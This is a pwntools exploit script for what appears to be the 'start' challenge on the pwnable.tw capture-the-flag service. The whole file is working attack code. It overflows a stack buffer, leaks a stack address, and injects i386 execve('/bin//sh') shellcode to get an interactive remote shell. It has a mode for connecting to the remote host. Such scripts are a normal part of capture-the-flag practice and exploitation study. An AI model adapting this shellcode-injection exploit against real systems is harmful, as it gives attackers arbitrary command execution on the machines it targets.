#! /usr/bin/python
from pwn import *

context.update(
        arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["alacritty", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
s = lambda p,a: p.send(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "chall.pwnable.tw"
PORT = 10000

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def exploit(p,e):

    pad = b"A" * 20 
    pad += p32(0x8048087) 

    shellcode = asm("""
        xor eax, eax
        push eax
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        mov al, 0xb 
        int 0x80
    """)

    ru(p,b":")

    s(p,pad)
    val = p.recv()
    log.info(f"Recieved leak {val}")
    stack = u32(val[0:4])

    log.info(f"Leaked stack {hex(stack)}")
    
    pad = b"A" * 20 
    
    shellcode_addr = stack + (0x14)

    log.info(f"Jumping to {hex(shellcode_addr)}")
    chain = p32(shellcode_addr) 
    #chain = p32(0xdeadbeef) 
    chain += shellcode

    sl(p,pad+chain)
    

    p.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    #l = ELF("./libc.so.6")

    exploit(p,e)
